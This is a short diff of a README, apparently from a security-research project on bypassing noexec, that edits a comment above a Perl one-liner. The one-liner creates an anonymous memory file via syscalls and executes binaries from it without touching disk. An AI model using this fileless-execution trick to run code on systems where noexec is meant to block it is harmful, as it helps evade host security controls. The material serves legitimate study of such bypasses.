@@ -18,7 +18,7 @@ Read the [circumventing the noexec Article](https://iq.thc.org/bypassing-noexec-
 
 ### PERL example:
 ```sh
-# From source memexec-perl.sh
+# From memexec-perl.sh
 memexec(){ perl '-e$^F=255;for(319,279,385,314){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV' -- "$@";}
 cat /bin/ls | TIME_STYLE=+%s memexec -lah
 ```
